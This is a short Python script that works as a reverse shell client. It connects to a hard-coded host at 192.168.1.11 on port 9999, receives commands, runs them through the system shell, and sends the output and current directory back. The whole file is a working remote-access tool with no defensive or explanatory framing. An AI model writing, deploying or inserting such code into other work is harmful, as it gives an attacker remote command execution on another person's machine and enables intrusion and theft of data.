import socket
import subprocess
import os



s = socket.socket()
host = '192.168.1.11'
port = 9999

s.connect((host,port))

while True:
	data = s.recv(1024)
	if data[:2].decode('UTF-8') == 'cd':
		try:
			os.chdir(data[3:].decode('UTF-8'))
		except FileNotFoundError:
			pass
	#CMD 
	if len(data) > 0:
		cmd = subprocess.Popen(data.decode('UTF-8'), shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
		out_bytes = cmd.stdout.read() + cmd.stderr.read()
		out_str = str(out_bytes.decode('UTF-8', 'ignore'))
		curr_wd = os.getcwd() + '(-_-) -> '
		s.send((curr_wd + out_str).encode())
		
		
		
		
